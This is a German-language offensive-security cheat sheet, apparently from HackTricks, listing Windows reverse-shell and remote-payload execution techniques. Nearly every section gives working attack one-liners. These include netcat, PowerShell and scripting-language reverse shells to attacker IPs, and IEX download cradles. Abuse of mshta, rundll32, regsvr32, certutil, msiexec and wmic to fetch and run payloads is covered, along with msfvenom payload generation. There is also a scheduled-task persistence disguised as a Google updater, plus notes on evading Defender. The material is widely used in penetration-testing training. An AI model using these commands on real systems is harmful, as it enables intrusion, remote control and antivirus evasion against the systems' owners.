# Shells - Windows

{{#include ../../banners/hacktricks-training.md}}

## Lolbas

Die Seite [lolbas-project.github.io](https://lolbas-project.github.io/) ist für Windows das, was [https://gtfobins.github.io/](https://gtfobins.github.io/) für Linux ist.\
Offensichtlich gibt es **keine SUID-Dateien oder sudo-Berechtigungen in Windows**, aber es ist nützlich zu wissen, **wie** einige **Binaries** (missbräuchlich) verwendet werden können, um unerwartete Aktionen wie das **Ausführen beliebigen Codes** durchzuführen.

## NC
```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```
## NCAT

Opfer
```
ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
#Encryption to bypass firewall
ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
```
Angreifer
```
ncat -l <PORT>
#Encryption to bypass firewall
ncat -l <PORT eg.443> --ssl
```
## SBD

**[sbd](https://www.kali.org/tools/sbd/) ist eine portable und sichere Netcat-Alternative**. Es funktioniert auf Unix-ähnlichen Systemen und Win32. Mit Funktionen wie starker Verschlüsselung, Programmausführung, anpassbaren Quellports und kontinuierlicher Wiederverbindung bietet sbd eine vielseitige Lösung für die TCP/IP-Kommunikation. Für Windows-Nutzer kann die sbd.exe-Version aus der Kali-Linux-Distribution als zuverlässiger Ersatz für Netcat verwendet werden.
```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```
## Python
```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
## Perl
```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## Lua
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## OpenSSH

Angreifer (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Opfer
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## Powershell
```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```
Prozess, der den Netzwerkaufruf durchführt: **powershell.exe**\
Payload auf die Festplatte geschrieben: **NEIN** (_zumindest nirgendwo, wo ich es mit procmon finden konnte!_)
```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```
Prozess, der den Netzwerkaufruf durchführt: **svchost.exe**\
Payload auf Datenträger geschrieben: **Lokaler Cache des WebDAV-Clients**

**Einzeiler:**
```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
**Weitere Informationen zu verschiedenen Powershell Shells am Ende dieses Dokuments**

## Mshta

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```
#### **Beispiel für eine hta-psh reverse shell (Verwendung von hta zum Herunterladen und Ausführen einer PS backdoor)**
```xml
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```
**Du kannst sehr einfach einen Koadic-Zombie mithilfe des hta-Stagers herunterladen und ausführen**<sup>[[3]](#references)</sup>

#### hta-Beispiel

[**Von hier**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)<sup>[[7]](#references)</sup>
```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
var c = "cmd.exe /c calc.exe";
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```
#### **mshta - sct**

[**Von hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Mshta - Metasploit**
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```
**Vom Defender erkannt**

## **Rundll32**

[**DLL-Hello-World-Beispiel**](https://github.com/carterjones/hello-world-dll)

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```
**Vom Defender erkannt**

**Rundll32 - sct**

[**Von hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)<sup>[[8]](#references)</sup>
```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```
#### **Rundll32 - Metasploit**
```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```
**Rundll32 - Koadic**
```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```
## Regsvr32

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```
**Vom Defender erkannt**

#### Regsvr32 – beliebiger DLL-Export mit /i-Argument (Gatekeeping & Persistence)

Neben dem Laden von Remote-Scriptlets (`scrobj.dll`) lädt `regsvr32.exe` eine lokale DLL und ruft deren Exporte `DllRegisterServer`/`DllUnregisterServer` auf. Benutzerdefinierte Loader missbrauchen dies häufig, um beliebigen Code auszuführen und sich dabei mit einem signierten LOLBin zu tarnen. Zwei in freier Wildbahn beobachtete Tradecraft-Hinweise:<sup>[[6]](#references)</sup>

- Gatekeeping-Argument: Die DLL wird beendet, sofern kein bestimmter Switch über `/i:<arg>` übergeben wird, z. B. `/i:--type=renderer`, um Chromium-Renderer-Kinder nachzuahmen. Dies reduziert eine versehentliche Ausführung und erschwert Sandboxes.
- Persistence: `regsvr32` so planen, dass die DLL mit stiller Ausführung, hohen Berechtigungen und dem erforderlichen `/i`-Argument ausgeführt wird, wobei sie sich als Updater-Task tarnt:
```powershell
Register-ScheduledTask \
-Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
-Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
-TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
-TaskPath '\\GoogleSystem\\GoogleUpdater' \
-Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
-RunLevel Highest
```

Siehe auch: ClickFix-Variante für Clipboard-to-PowerShell, die einen JS-Loader staged und später mit `regsvr32` Persistence einrichtet.
{{#ref}}
../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
{{#endref}}


[**Von hier**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)<sup>[[9]](#references)</sup>
```html
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
progid="PoC"
classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</registration>
</scriptlet>
```
#### **Regsvr32 - Metasploit**
```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Du kannst sehr einfach einen Koadic zombie mit dem stager regsvr herunterladen und ausführen**<sup>[[3]](#references)</sup>

## Certutil

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>

Eine B64dll herunterladen, decodieren und ausführen.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Lade ein B64exe herunter, dekodiere es und führe es aus.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Vom Defender erkannt**

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Von Defender erkannt**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Prozess, der den Netzwerkaufruf durchführt: **svchost.exe**\
Payload auf den Datenträger geschrieben: **lokaler Cache des WebDAV-Clients**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Vom Defender erkannt**

## **MSIExec**

Angreifer
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Opfer:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Erkannt**

## **Wmic**

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Beispiel für eine xsl-Datei [hier](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):<sup>[[10]](#references)</sup>
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Nicht erkannt**

**Sie können einen Koadic zombie mit dem stager wmic sehr einfach herunterladen und ausführen**<sup>[[3]](#references)</sup>

## Msbuild

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Du kannst diese Technik verwenden, um Application Whitelisting und Powershell.exe-Einschränkungen zu umgehen. Anschließend wird dir eine PS-Shell angezeigt.\
Lade dies einfach herunter und führe es aus: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Nicht erkannt**

## **CSC**

Kompilieren Sie C#-Code auf dem Opfercomputer.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Du kannst hier eine einfache C# reverse shell herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Nicht erkannt**

## **Regasm/Regsvc**

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Ich habe es nicht ausprobiert**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**]<sup>[[2]](#references)</sup>

## Odbcconf

- [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)<sup>[[5]](#references)</sup>
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Ich habe es nicht ausprobiert**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)<sup>[[2]](#references)</sup>

## PowerShell-Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Im Ordner **Shells** gibt es viele verschiedene Shells. Um _Invoke-PowerShellTcp.ps1_ herunterzuladen und auszuführen, erstelle eine Kopie des Scripts und füge am Ende der Datei Folgendes hinzu:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Stelle das Skript auf einem Webserver bereit und führe es beim Opfer aus:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender erkennt es nicht als schädlichen Code (noch nicht, 3.04.2019).

**TODO: Andere nishang-Shells überprüfen**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Herunterladen, einen Webserver starten, den Listener starten und es auf der Seite des Opfers ausführen:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender erkennt es nicht als schädlichen Code (noch nicht, 3.04.2019).

**Weitere von powercat angebotene Optionen:**

Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, Upload/Download, Payloads generieren, Dateien bereitstellen ...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Erstelle einen PowerShell-Launcher, speichere ihn in einer Datei und lade ihn herunter und führe ihn aus.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Als schädlicher Code erkannt**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Erstelle mithilfe von Unicorn eine PowerShell-Version der Metasploit-Backdoor.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Starte msfconsole mit der erstellten Resource:
```
msfconsole -r unicorn.rc
```
Starten Sie einen Webserver, der die Datei _powershell_attack.txt_ bereitstellt, und führen Sie auf dem Opfer Folgendes aus:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Als bösartiger Code erkannt**

## Mehr

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen vorinstallierten offensiven PS-Modulen (verschlüsselt)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
[WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensiven PS-Modulen und Proxy-Erkennung (IEX)

## Referenzen

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Arno0x' GitHub-Gists](https://gist.github.com/Arno0x)
- [3] [Koadic – COM Command & Control Framework](https://www.hackingarticles.in/koadic-com-command-control-framework/)
- [4] [Reverse Shell Cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [Windows-Oneliner zum Herunterladen eines entfernten Payloads und Ausführen beliebigen Codes](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [6] [Check Point Research – Under the Pure Curtain: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [7] [calc.hta – Beispiel für eine HTA-Reverse-Execution (Arno0x-Gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
- [8] [scriptlet.sct – Beispiel für ein mshta/rundll32-Scriptlet (Arno0x-Gist)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
- [9] [regsvr32.sct – Beispiel für ein Regsvr32-Scriptlet (Arno0x-Gist)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
- [10] [wmic.xsl – Beispiel für ein WMIC-XSL-Stylesheet (Arno0x-Gist)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)

{{#include ../../banners/hacktricks-training.md}}
